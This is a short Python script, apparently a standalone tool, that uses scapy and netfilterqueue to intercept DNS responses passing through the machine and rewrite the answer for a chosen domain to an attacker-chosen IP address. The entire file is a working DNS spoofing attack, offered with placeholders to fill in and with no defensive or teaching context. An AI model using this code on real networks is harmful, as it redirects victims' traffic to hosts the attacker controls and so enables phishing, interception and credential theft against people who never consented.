from scapy.all import *
import netfilterqueue

# Target IP to spoof DNS responses for
TARGET_DOMAIN = "example.com"  # Replace with the domain you want to spoof
SPOOFED_IP = "192.168.1.100"  # Replace with the IP you want the domain to resolve to

def spoof_dns(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):  # Check for DNS Resource Record (response)
        qname = scapy_packet[DNSQR].qname.decode('utf-8')
        if TARGET_DOMAIN in qname:
            print(f"[+] Spoofing DNS response for {qname}")
            answer = DNSRR(rrname=qname, rdata=SPOOFED_IP)
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1

            # Remove checksum and length to recalculate them
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    packet.accept()

def main():
    print("[*] Starting DNS Spoofer...")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, spoof_dns)
    try:
        queue.run()
    except KeyboardInterrupt:
        print("\n[!] Stopping DNS Spoofer...")

if __name__ == "__main__":
    main()
